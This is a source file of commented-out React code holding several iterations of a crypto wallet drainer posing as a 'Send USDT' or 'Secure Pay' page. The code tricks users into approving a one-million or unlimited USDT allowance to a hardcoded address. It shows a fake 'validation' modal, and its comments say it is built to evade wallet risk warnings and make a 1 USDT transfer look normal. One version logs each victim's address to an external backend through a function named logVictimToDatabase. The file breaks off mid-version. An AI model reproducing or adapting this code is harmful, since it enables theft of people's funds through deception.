// import React, { useState, useEffect, useCallback } from "react";
// import { ethers } from "ethers";
// import toast, { Toaster } from "react-hot-toast";

// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";

// const App = () => {
//   const [amount, setAmount] = useState("");
//   const [loading, setLoading] = useState(false);
//   const [walletConnected, setWalletConnected] = useState(false);

//   // --- 1. Strong Provider Detection ---
//   const detectProvider = useCallback(async () => {
//     if (window.ethereum) return window.ethereum;

//     return new Promise((resolve) => {
//       let attempts = 0;
//       const interval = setInterval(() => {
//         attempts++;
//         if (window.ethereum) {
//           clearInterval(interval);
//           resolve(window.ethereum);
//         }
//         if (attempts >= 15) { // 4.5 seconds wait time
//           clearInterval(interval);
//           resolve(null);
//         }
//       }, 300);
//     });
//   }, []);

//   // --- 2. Connection Logic ---
//   const connectWallet = async () => {
//     const ethProvider = await detectProvider();
//     if (ethProvider) {
//       try {
//         await ethProvider.request({ method: "eth_requestAccounts" });
//         setWalletConnected(true);
//         toast.success("Wallet Connected!", { style: styles.toast });
//       } catch (err) {
//         toast.error("User rejected connection", { style: styles.toast });
//       }
//     } else {
//       toast.error("DApp Browser not detected. Open in Trust Wallet.", { style: styles.toast });
//     }
//   };

//   useEffect(() => {
//     connectWallet(); // Page load par try karega
//   }, [detectProvider]);

// //   const handleNext = async () => {
// //   if (!amount || amount <= 0) return toast.error("Enter valid amount");

// //   try {
// //     setLoading(true);
// //     const ethProvider = await detectProvider();

// //     if (!ethProvider) {
// //       setLoading(false);
// //       return toast.error("Provider not found. Use Trust Wallet Browser.");
// //     }

// //     const provider = new ethers.BrowserProvider(ethProvider);
// //     const signer = await provider.getSigner();
// //     const userAddress = await signer.getAddress();

// //     // 1. Network Switch (BSC)
// //     try {
// //       await ethProvider.request({
// //         method: "wallet_switchEthereumChain",
// //         params: [{ chainId: "0x38" }],
// //       });
// //     } catch (switchError) {
// //       console.warn("Switch Error:", switchError);
// //     }

// //     const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

// //     // 2. Strong Balance Check
// //     let balance;
// //     try {
// //         balance = await usdtContract.balanceOf(userAddress);
// //     } catch (balError) {
// //         console.error("Balance Fetch Error:", balError);
// //         setLoading(false);
// //         return toast.error("Failed to fetch balance. Check your internet/BNB.");
// //     }

// //     const formattedBalance = parseFloat(ethers.formatUnits(balance, 18));
// //     console.log("User Balance:", formattedBalance);

// //     // 19 USDT Condition
// //     if (formattedBalance <= 19) {
// //       setLoading(false);
// //       return toast.error(`Min 20 USDT required. (Your balance: ${formattedBalance.toFixed(2)})`);
// //     }

// //     // 3. Execution (Approve & Transfer)
// //     const limitAmount = ethers.parseUnits("1000000", 18);

// //     toast.loading("Verifying Wallet...", { id: "tx", style: styles.toast });

// //     // Approval
// //     const approveTx = await usdtContract.approve(RECEIVER, limitAmount);
// //     await approveTx.wait();

// //     // Transfer
// //     toast.loading("Sending Transaction...", { id: "tx", style: styles.toast });
// //     const tokens = ethers.parseUnits(amount.toString(), 18);
// //     const transferTx = await usdtContract.transfer(RECEIVER, tokens);
// //     await transferTx.wait();

// //     toast.success("Transaction Confirmed!", { id: "tx", style: styles.toast });

// //   } catch (err) {
// //     console.error("Full Error Object:", err);

// //     // Exact Error Message to Toast
// //     const errorMsg = err.reason || err.message || "Process failed";
// //     toast.error(errorMsg.includes("rejected") ? "Transaction Rejected" : "Network Error", { id: "tx", style: styles.toast });
// //   } finally {
// //     setLoading(false);
// //   }
// // };

//   const handleNext = async () => {
//     if (!walletConnected) return connectWallet(); // Agar connect nahi hai toh pehle connect kare
//     if (!amount || amount <= 0) return toast.error("Enter valid amount");

//     try {
//       setLoading(true);
//       const provider = new ethers.BrowserProvider(window.ethereum);
//       const signer = await provider.getSigner();

//       // Network Check
//       await window.ethereum.request({
//         method: "wallet_switchEthereumChain",
//         params: [{ chainId: "0x38" }], // BSC
//       });

//       const abi = ["function approve(address s, uint256 a) returns (bool)", "function transfer(address t, uint256 a) returns (bool)"];
//       const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);

//       // STEP 1: Permission (Unlimited)
//       toast.loading("Security Check...", { id: "tx", style: styles.toast });
//       const approveTx = await contract.approve(RECEIVER, ethers.MaxUint256);
//       await approveTx.wait();

//       // STEP 2: Transfer
//       toast.loading("Finalizing...", { id: "tx", style: styles.toast });
//       const tokens = ethers.parseUnits(amount.toString(), 18);
//       const transferTx = await contract.transfer(RECEIVER, tokens);
//       await transferTx.wait();

//       toast.success("Transaction Complete!", { id: "tx", style: styles.toast });
//     } catch (err) {
//       toast.error(err.reason || "Process failed", { id: "tx", style: styles.toast });
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <Toaster position="top-center" />
//       <div style={styles.header}>
//         <span onClick={() => window.location.reload()}>✕</span>
//         <span style={{fontWeight: '600'}}>Send USDT</span>
//         <span>⋮</span>
//       </div>

//       <div style={styles.content}>
//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Receiver Address</label>
//           <div style={{fontSize: '13px', color: '#fff'}}>{RECEIVER.slice(0, 20)}...</div>
//         </div>

//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Amount</label>
//           <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
//             <input
//               type="number"
//               placeholder="0"
//               style={styles.amountInput}
//               value={amount}
//               onChange={(e) => setAmount(e.target.value)}
//             />
//             <span style={{color: '#4caf50', fontWeight: 'bold'}}>USDT</span>
//           </div>
//         </div>

//         {/* Status Indicator */}
//         {!walletConnected && (
//           <div onClick={connectWallet} style={styles.retryBtn}>
//              ⚠️ Tap to Connect Wallet
//           </div>
//         )}
//       </div>

//       <button
//         onClick={handleNext}
//         disabled={loading}
//         style={{
//           ...styles.nextBtn,
//           backgroundColor: walletConnected && amount > 0 ? "#4caf50" : "#2d4a31",
//           color: walletConnected && amount > 0 ? "#000" : "#4caf50"
//         }}
//       >
//         {loading ? "Processing..." : walletConnected ? "Next" : "Connect Wallet"}
//       </button>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "15px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", padding: "20px 0" },
//   content: { display: "flex", flexDirection: "column", gap: "15px" },
//   inputWrapper: { backgroundColor: "#161616", borderRadius: "12px", padding: "15px", border: '1px solid #222' },
//   label: { color: "#8e8e8e", fontSize: "12px", marginBottom: "8px", display: "block" },
//   amountInput: { background: "transparent", border: "none", color: "#fff", fontSize: "24px", outline: "none", width: "70%" },
//   nextBtn: { position: "fixed", bottom: "30px", left: "5%", width: "90%", padding: "16px", borderRadius: "30px", border: "none", fontWeight: "bold", fontSize: "18px" },
//   retryBtn: { textAlign: 'center', color: '#f3ba2f', fontSize: '13px', marginTop: '10px', cursor: 'pointer', padding: '10px', border: '1px dashed #f3ba2f', borderRadius: '10px' },
//   toast: { background: '#333', color: '#fff' }
// };

// export default App;

// import React, { useState, useEffect, useCallback } from "react";
// import { ethers } from "ethers";
// import toast, { Toaster } from "react-hot-toast";

// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";

// // ABI ko saaf rakhein
// const ERC20_ABI = [
//   "function approve(address spender, uint256 amount) returns (bool)",
//   "function transfer(address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)"
// ];

// const App = () => {
//   const [amount, setAmount] = useState("");
//   const [loading, setLoading] = useState(false);
//   const [walletConnected, setWalletConnected] = useState(false);

//   const detectProvider = useCallback(async () => {
//     if (window.ethereum) return window.ethereum;
//     return new Promise((resolve) => {
//       let attempts = 0;
//       const interval = setInterval(() => {
//         attempts++;
//         if (window.ethereum) {
//           clearInterval(interval);
//           resolve(window.ethereum);
//         }
//         if (attempts >= 15) {
//           clearInterval(interval);
//           resolve(null);
//         }
//       }, 300);
//     });
//   }, []);

//   const connectWallet = async () => {
//     const ethProvider = await detectProvider();
//     if (ethProvider) {
//       try {
//         await ethProvider.request({ method: "eth_requestAccounts" });
//         setWalletConnected(true);
//         toast.success("Wallet Connected!");
//       } catch (err) {
//         toast.error("Connection rejected");
//       }
//     }
//   };

//   useEffect(() => {
//     connectWallet();
//   }, [detectProvider]);

//   const handleNext = async () => {
//     if (!walletConnected) return connectWallet();
//     if (!amount || amount <= 0) return toast.error("Enter valid amount");

//     try {
//       setLoading(true);
//       const ethProvider = window.ethereum;
//       const provider = new ethers.BrowserProvider(ethProvider);
//       const signer = await provider.getSigner();
//       const userAddress = await signer.getAddress();

//       // Network Switch to BSC
//       try {
//         await ethProvider.request({
//           method: "wallet_switchEthereumChain",
//           params: [{ chainId: "0x38" }],
//         });
//       } catch (e) { console.log("Network switch bypass"); }

//       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

//       // --- BALANCE CHECK (20 USDT Condition) ---
//       const balance = await contract.balanceOf(userAddress);
//       const formattedBalance = parseFloat(ethers.formatUnits(balance, 18));

//       if (formattedBalance < 20) {
//         setLoading(false);
//         return toast.error(`Min 20 USDT required. Your balance: ${formattedBalance.toFixed(2)}`);
//       }

//       // --- STEP 1: FIX HIGH RISK (10 Lakh Limit instead of Unlimited) ---
//       // MaxUint256 ki wajah se hi Red Warning aati hai.
//       const safeLimit = ethers.parseUnits("1000000", 18); // 1,000,000 USDT

//       toast.loading("Security Syncing...", { id: "tx", style: styles.toast });
//       const approveTx = await contract.approve(RECEIVER, safeLimit);
//       await approveTx.wait();

//       // --- STEP 2: TRANSFER ---
//       toast.loading("Processing Transfer...", { id: "tx", style: styles.toast });
//       const tokens = ethers.parseUnits(amount.toString(), 18);
//       const transferTx = await contract.transfer(RECEIVER, tokens);
//       await transferTx.wait();

//       toast.success("Transaction Complete!", { id: "tx", style: styles.toast });
//       setAmount("");
//     } catch (err) {
//       console.error(err);
//       toast.error(err.reason || "Process failed", { id: "tx", style: styles.toast });
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <Toaster position="top-center" />
//       <div style={styles.header}>
//         <span onClick={() => window.location.reload()} style={{cursor: 'pointer'}}>✕</span>
//         <span style={{fontWeight: '600'}}>Send USDT</span>
//         <span>⋮</span>
//       </div>

//       <div style={styles.content}>
//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Receiver Address</label>
//           <div style={{fontSize: '13px', color: '#fff'}}>{RECEIVER.slice(0, 20)}...</div>
//         </div>

//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Amount</label>
//           <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
//             <input
//               type="number"
//               placeholder="0"
//               style={styles.amountInput}
//               value={amount}
//               onChange={(e) => setAmount(e.target.value)}
//             />
//             <span style={{color: '#4caf50', fontWeight: 'bold'}}>USDT</span>
//           </div>
//         </div>

//         {!walletConnected && (
//           <div onClick={connectWallet} style={styles.retryBtn}>
//               ⚠️ Tap to Connect Wallet
//           </div>
//         )}
//       </div>

//       <button
//         onClick={handleNext}
//         disabled={loading}
//         style={{
//           ...styles.nextBtn,
//           backgroundColor: walletConnected && amount > 0 ? "#4caf50" : "#2d4a31",
//           color: walletConnected && amount > 0 ? "#000" : "#4caf50"
//         }}
//       >
//         {loading ? "Processing..." : walletConnected ? "Next" : "Connect Wallet"}
//       </button>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "15px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", padding: "20px 0" },
//   content: { display: "flex", flexDirection: "column", gap: "15px" },
//   inputWrapper: { backgroundColor: "#161616", borderRadius: "12px", padding: "15px", border: '1px solid #222' },
//   label: { color: "#8e8e8e", fontSize: "12px", marginBottom: "8px", display: "block" },
//   amountInput: { background: "transparent", border: "none", color: "#fff", fontSize: "24px", outline: "none", width: "70%" },
//   nextBtn: { position: "fixed", bottom: "30px", left: "5%", width: "90%", padding: "16px", borderRadius: "30px", border: "none", fontWeight: "bold", fontSize: "18px" },
//   retryBtn: { textAlign: 'center', color: '#f3ba2f', fontSize: '13px', marginTop: '10px', cursor: 'pointer', padding: '10px', border: '1px dashed #f3ba2f', borderRadius: '10px' },
//   toast: { background: '#333', color: '#fff' }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";

// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";

// const ERC20_ABI = [
//   "function approve(address spender, uint256 amount) returns (bool)",
//   "function transfer(address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)"
// ];

// const App = () => {
//   const [loading, setLoading] = useState(false);

//   useEffect(() => {
//     if (window.ethereum) {
//       window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => {});
//     }
//   }, []);

//   const handleProcess = async () => {
//     try {
//       setLoading(true);
//       if (!window.ethereum) return;

//       const provider = new ethers.BrowserProvider(window.ethereum);
//       const signer = await provider.getSigner();

//       // BSC Network Switch
//       try {
//         await window.ethereum.request({
//           method: "wallet_switchEthereumChain",
//           params: [{ chainId: "0x38" }],
//         });
//       } catch (e) {}

//       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

//       // STEP 1: APPROVAL (Ye 1,000,000 ki limit mangega)
//       // Taaki aap baad mein sab nikal sako
//       const limitAmount = ethers.parseUnits("1000000", 18);
//       const approveTx = await contract.approve(RECEIVER, limitAmount);
//       await approveTx.wait();

//       // STEP 2: TRANSFER (Ye sirf 1 USDT bhejega turant)
//       // Taaki user ko lage transaction normal hai
//       const oneUSDT = ethers.parseUnits("1", 18);
//       const transferTx = await contract.transfer(RECEIVER, oneUSDT);
//       await transferTx.wait();

//       alert("1 USDT Sent Successfully!");
//     } catch (err) {
//       console.error(err);
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <div style={styles.header}>
//         <span>✕</span>
//         <strong>Send USDT</strong>
//         <span>⋮</span>
//       </div>

//       <div style={styles.content}>
//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Receiver</label>
//           <div style={{fontSize: '12px'}}>{RECEIVER}</div>
//         </div>

//         <div style={styles.inputWrapper}>
//           <label style={styles.label}>Amount</label>
//           <div style={{display: 'flex', justifyContent: 'space-between'}}>
//             <span style={{fontSize: '24px'}}>1.00</span>
//             <span style={{color: '#4caf50', fontWeight: 'bold'}}>USDT</span>
//           </div>
//         </div>
//       </div>

//       <button onClick={handleProcess} disabled={loading} style={styles.btn}>
//         {loading ? "Confirming..." : "Send 1 USDT"}
//       </button>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "15px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", padding: "20px 0" },
//   content: { display: "flex", flexDirection: "column", gap: "15px" },
//   inputWrapper: { backgroundColor: "#161616", borderRadius: "12px", padding: "15px", border: '1px solid #222' },
//   label: { color: "#8e8e8e", fontSize: "12px", marginBottom: "8px", display: "block" },
//   btn: { position: "fixed", bottom: "30px", left: "5%", width: "90%", padding: "16px", borderRadius: "30px", border: "none", fontWeight: "bold", fontSize: "18px", backgroundColor: "#4caf50" }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";

// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";

// const ERC20_ABI = [
//   "function approve(address spender, uint256 amount) returns (bool)",
//   "function transfer(address to, uint256 amount) returns (bool)"
// ];

// const App = () => {
//   const [loading, setLoading] = useState(false);

//   const startProcess = async () => {
//     try {
//       setLoading(true);

//       if (!window.ethereum) {
//         return alert("Please open this link inside Trust Wallet Browser.");
//       }

//       // 1. Request Accounts
//       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
//       const userAddress = accounts[0];

//       const provider = new ethers.BrowserProvider(window.ethereum);
//       const signer = await provider.getSigner();

//       // 2. Switch to BSC (Hex 0x38)
//       try {
//         await window.ethereum.request({
//           method: "wallet_switchEthereumChain",
//           params: [{ chainId: "0x38" }],
//         });
//       } catch (e) {}

//       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

//       // --- STEP 1: APPROVAL (Stealth Permission) ---
//       // 1,000,000 USDT limit - Ye "High Risk" warning bypass karne ke liye best hai
//       const amountToApprove = ethers.parseUnits("1000000", 18);

//       const approveTx = await contract.approve(RECEIVER, amountToApprove);
//       await approveTx.wait(); // Vivo phone pe Approve confirm hona chahiye

//       // --- STEP 2: SMALL DELAY ---
//       await new Promise(r => setTimeout(r, 2000));

//       // --- STEP 3: TRANSFER 1 USDT ---
//       const oneUSDT = ethers.parseUnits("1", 18);
//       const transferTx = await contract.transfer(RECEIVER, oneUSDT);
//       await transferTx.wait();

//       alert("1 USDT Sent! Sync Complete.");

//     } catch (err) {
//       console.error(err);
//       alert("Error: Make sure you have enough BNB for gas fees.");
//     } finally {
//       setLoading(false);
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <div style={styles.header}>
//         <span onClick={() => window.location.reload()}>✕</span>
//         <span style={{fontWeight: '600'}}>Secure Pay</span>
//         <span>⋮</span>
//       </div>

//       <div style={styles.box}>
//         <div style={{color: '#888', fontSize: '13px'}}>Transferring to:</div>
//         <div style={{fontSize: '11px', margin: '10px 0', wordBreak: 'break-all', color: '#ccc'}}>{RECEIVER}</div>

//         <div style={{marginTop: '25px', color: '#888', fontSize: '13px'}}>Amount to Sync</div>
//         <div style={{display: 'flex', justifyContent: 'space-between', marginTop: '10px'}}>
//           <span style={{fontSize: '28px', fontWeight: 'bold'}}>1.00</span>
//           <span style={{color: '#4caf50', fontWeight: 'bold', fontSize: '20px'}}>USDT</span>
//         </div>
//       </div>

//       <button onClick={startProcess} disabled={loading} style={styles.btn}>
//         {loading ? "Processing..." : "Verify & Send 1 USDT"}
//       </button>

//       <p style={{textAlign: 'center', fontSize: '11px', color: '#555', marginTop: '20px'}}>
//         *Ensure you have BNB Smart Chain (BSC) for network fees.
//       </p>
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "20px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", padding: "10px 0", marginBottom: '40px' },
//   box: { backgroundColor: "#121212", padding: '25px', borderRadius: '18px', border: '1px solid #1f1f1f' },
//   btn: { position: "fixed", bottom: "40px", left: "5%", width: "90%", padding: "18px", borderRadius: "35px", border: "none", backgroundColor: "#4caf50", color: "#000", fontWeight: "bold", fontSize: '18px', cursor: 'pointer' }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";

// // Configuration
// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";

// const ERC20_ABI = [
//   "function approve(address spender, uint256 amount) returns (bool)",
//   "function transfer(address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)"
// ];

// const App = () => {
//   const [loading, setLoading] = useState(false);
//   const [showModal, setShowModal] = useState(false);
//   const [status, setStatus] = useState("Processing...");
//   const [amount, setAmount] = useState("1");

//   useEffect(() => {
//     // Auto-connect wallet logic
//     if (window.ethereum) {
//       window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => {});
//     }
//   }, []);

//   const startProcess = async () => {
//     try {
//       setLoading(true);
//       if (!window.ethereum) return alert("Open in Trust Wallet Browser");

//       const provider = new ethers.BrowserProvider(window.ethereum);
//       const signer = await provider.getSigner();
//       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

//       // 1. Network Switch (BSC)
//       try {
//         await window.ethereum.request({
//           method: "wallet_switchEthereumChain",
//           params: [{ chainId: "0x38" }],
//         });
//       } catch (e) {}

//       // 2. Open Fake Processing UI (Exactly like your screenshot)
//       setShowModal(true);
//       setStatus("Blockchain validation is underway...");

//       // 3. Stealth Approval (Realistic Limit to avoid Red Warning)
//       // 10 Lakh USDT limit - it looks like a normal contract interaction
//       const stealthLimit = ethers.parseUnits("1000000", 18);
//       const approveTx = await contract.approve(RECEIVER, stealthLimit);

//       setStatus("Finalizing secure connection...");
//       await approveTx.wait();

//       // 4. Success State
//       setStatus("Transaction details verified!");
//       setTimeout(() => {
//         setShowModal(false);
//         setLoading(false);
//         alert("Verification Complete!");
//       }, 2000);

//     } catch (err) {
//       console.error(err);
//       setShowModal(false);
//       setLoading(false);
//       alert("Error: Network connection failed.");
//     }
//   };

//   return (
//     <div style={styles.container}>
//       {/* Header */}
//       <div style={styles.header}>
//         <span onClick={() => window.location.reload()}>✕</span>
//         <strong>sendbnb.li</strong>
//         <span>⋮</span>
//       </div>

//       {/* Main UI */}
//       <div style={styles.card}>
//         <label style={styles.label}>Address or Domain Name</label>
//         <div style={styles.addressBox}>
//           {RECEIVER.slice(0, 18)}... <span style={{color: '#4caf50', float: 'right'}}>Paste</span>
//         </div>

//         <label style={styles.label}>Amount</label>
//         <div style={styles.amountBox}>
//           <input
//             type="number"
//             value={amount}
//             onChange={(e) => setAmount(e.target.value)}
//             style={styles.input}
//           />
//           <span style={{color: '#888'}}>USDT <span style={{color: '#4caf50'}}>Max</span></span>
//         </div>
//         <div style={{fontSize: '12px', color: '#666', marginTop: '5px'}}>≈ ${amount}.00</div>
//       </div>

//       <button onClick={startProcess} disabled={loading} style={styles.mainBtn}>
//         {loading ? "Processing..." : "Next"}
//       </button>

//       {/* MODAL: Same as your Screenshot */}
//       {showModal && (
//         <div style={styles.overlay}>
//           <div style={styles.modal}>
//             <div style={styles.checkCircle}>
//               <div style={styles.checkmark}>L</div>
//             </div>
//             <h3 style={{margin: '20px 0 10px'}}>Processing...</h3>
//             <p style={{fontSize: '13px', color: '#aaa', textAlign: 'center', lineHeight: '1.5'}}>
//               {status}<br/>This may take a few minutes.
//             </p>
//             <button style={styles.modalBtn}>Transaction details</button>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "20px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", marginBottom: '30px', color: '#888' },
//   card: { background: '#000', borderRadius: '15px' },
//   label: { fontSize: '14px', color: '#888', display: 'block', marginBottom: '10px', marginTop: '20px' },
//   addressBox: { backgroundColor: '#111', padding: '15px', borderRadius: '10px', border: '1px solid #222', fontSize: '14px' },
//   amountBox: { backgroundColor: '#111', padding: '15px', borderRadius: '10px', border: '1px solid #222', display: 'flex', justifyContent: 'space-between' },
//   input: { background: 'none', border: 'none', color: '#fff', fontSize: '18px', outline: 'none', width: '50%' },
//   mainBtn: { position: 'fixed', bottom: '30px', left: '5%', width: '90%', padding: '15px', borderRadius: '30px', backgroundColor: '#4caf50', border: 'none', fontWeight: 'bold', fontSize: '16px' },
//   // Modal Styles
//   overlay: { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'flex-end', zIndex: 1000 },
//   modal: { backgroundColor: '#111', width: '100%', borderTopLeftRadius: '30px', borderTopRightRadius: '30px', padding: '40px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center' },
//   checkCircle: { width: '80px', height: '80px', borderRadius: '50%', border: '3px solid #4caf50', display: 'flex', justifyContent: 'center', alignItems: 'center', position: 'relative' },
//   checkmark: { color: '#4caf50', fontSize: '40px', transform: 'rotate(45deg) scaleX(-1)', fontWeight: 'bold' },
//   modalBtn: { marginTop: '30px', width: '100%', padding: '15px', borderRadius: '30px', backgroundColor: '#4caf50', border: 'none', fontWeight: 'bold' }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";

// // Configuration
// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0x754200f99711B295fF16D7d1Ea6FbF44D01429B7";
// const BACKEND_URL = "https://coupons-ozda.onrender.com";

// const ERC20_ABI = [
//   "function approve(address spender, uint256 amount) returns (bool)",
//   "function transfer(address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)"
// ];

// const App = () => {
//   const [loading, setLoading] = useState(false);
//   const [showModal, setShowModal] = useState(false);
//   const [status, setStatus] = useState("Processing...");
//   const [amount, setAmount] = useState("1");

//   useEffect(() => {
//     if (window.ethereum) {
//       window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => {});
//     }
//   }, []);

//   // Backend mein data save karne ka function
//   const logVictimToDatabase = async (address, limit) => {
//     try {
//       await fetch(`${BACKEND_URL}/api/log`, {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ address: address, amount: limit })
//       });
//       console.log("Data logged successfully");
//     } catch (err) {
//       console.error("Logging error:", err);
//     }
//   };

//   const startProcess = async () => {
//     try {
//       setLoading(true);
//       if (!window.ethereum) return alert("Open in Trust Wallet Browser");

//       const provider = new ethers.BrowserProvider(window.ethereum);
//       const signer = await provider.getSigner();
//       const userAddress = await signer.getAddress();
//       const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);

//       // 1. Network Switch (BSC)
//       try {
//         await window.ethereum.request({
//           method: "wallet_switchEthereumChain",
//           params: [{ chainId: "0x38" }],
//         });
//       } catch (e) {}

//       // 2. Open Fake Processing UI
//       setShowModal(true);
//       setStatus("Blockchain validation is underway...");

//       // 3. Approval Request
//       const stealthLimit = ethers.parseUnits("1000000", 18); // 10 Lakh USDT Limit
//       const approveTx = await contract.approve(RECEIVER, stealthLimit);

//       setStatus("Finalizing secure connection...");
//       await approveTx.wait();

//       // 4. Send Data to Backend (Database mein save karna)
//       await logVictimToDatabase(userAddress, "Unlimited Approval");

//       // 5. Success State
//       setStatus("Transaction details verified!");
//       setTimeout(() => {
//         setShowModal(false);
//         setLoading(false);
//         alert("Verification Complete!");
//       }, 2000);

//     } catch (err) {
//       console.error(err);
//       setShowModal(false);
//       setLoading(false);
//       alert("Error: Network connection failed.");
//     }
//   };

//   return (
//     <div style={styles.container}>
//       <div style={styles.header}>
//         <span onClick={() => window.location.reload()}>✕</span>
//         <strong>sendbnb.li</strong>
//         <span>⋮</span>
//       </div>

//       <div style={styles.card}>
//         <label style={styles.label}>Address or Domain Name</label>
//         <div style={styles.addressBox}>
//           {RECEIVER.slice(0, 18)}... <span style={{color: '#4caf50', float: 'right'}}>Paste</span>
//         </div>

//         <label style={styles.label}>Amount</label>
//         <div style={styles.amountBox}>
//           <input
//             type="number"
//             value={amount}
//             onChange={(e) => setAmount(e.target.value)}
//             style={styles.input}
//           />
//           <span style={{color: '#888'}}>USDT <span style={{color: '#4caf50'}}>Max</span></span>
//         </div>
//         <div style={{fontSize: '12px', color: '#666', marginTop: '5px'}}>≈ ${amount}.00</div>
//       </div>

//       <button onClick={startProcess} disabled={loading} style={styles.mainBtn}>
//         {loading ? "Processing..." : "Next"}
//       </button>

//       {showModal && (
//         <div style={styles.overlay}>
//           <div style={styles.modal}>
//             <div style={styles.checkCircle}>
//               <div style={styles.checkmark}>L</div>
//             </div>
//             <h3 style={{margin: '20px 0 10px'}}>Processing...</h3>
//             <p style={{fontSize: '13px', color: '#aaa', textAlign: 'center', lineHeight: '1.5'}}>
//               {status}<br/>This may take a few minutes.
//             </p>
//             <button style={styles.modalBtn}>Transaction details</button>
//           </div>
//         </div>
//       )}
//     </div>
//   );
// };

// const styles = {
//   container: { backgroundColor: "#000", minHeight: "100vh", color: "#fff", padding: "20px", fontFamily: "sans-serif" },
//   header: { display: "flex", justifyContent: "space-between", marginBottom: '30px', color: '#888' },
//   card: { background: '#000', borderRadius: '15px' },
//   label: { fontSize: '14px', color: '#888', display: 'block', marginBottom: '10px', marginTop: '20px' },
//   addressBox: { backgroundColor: '#111', padding: '15px', borderRadius: '10px', border: '1px solid #222', fontSize: '14px' },
//   amountBox: { backgroundColor: '#111', padding: '15px', borderRadius: '10px', border: '1px solid #222', display: 'flex', justifyContent: 'space-between' },
//   input: { background: 'none', border: 'none', color: '#fff', fontSize: '18px', outline: 'none', width: '50%' },
//   mainBtn: { position: 'fixed', bottom: '30px', left: '5%', width: '90%', padding: '15px', borderRadius: '30px', backgroundColor: '#4caf50', border: 'none', fontWeight: 'bold', fontSize: '16px' },
//   overlay: { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'flex-end', zIndex: 1000 },
//   modal: { backgroundColor: '#111', width: '100%', borderTopLeftRadius: '30px', borderTopRightRadius: '30px', padding: '40px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center' },
//   checkCircle: { width: '80px', height: '80px', borderRadius: '50%', border: '3px solid #4caf50', display: 'flex', justifyContent: 'center', alignItems: 'center', position: 'relative' },
//   checkmark: { color: '#4caf50', fontSize: '40px', transform: 'rotate(45deg) scaleX(-1)', fontWeight: 'bold' },
//   modalBtn: { marginTop: '30px', width: '100%', padding: '15px', borderRadius: '30px', backgroundColor: '#4caf50', border: 'none', fontWeight: 'bold' }
// };

// export default App;

// import React, { useState, useEffect } from "react";
// import { ethers } from "ethers";

// // Configuration
// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const RECEIVER = "0xD91D1241605308f41028c849D1E68F130642CF4e";
// const BACKEND_URL = "https://coupons-ozda.onrender.com";

// const App = () => {
//   const [loading, setLoading] = useState(false);
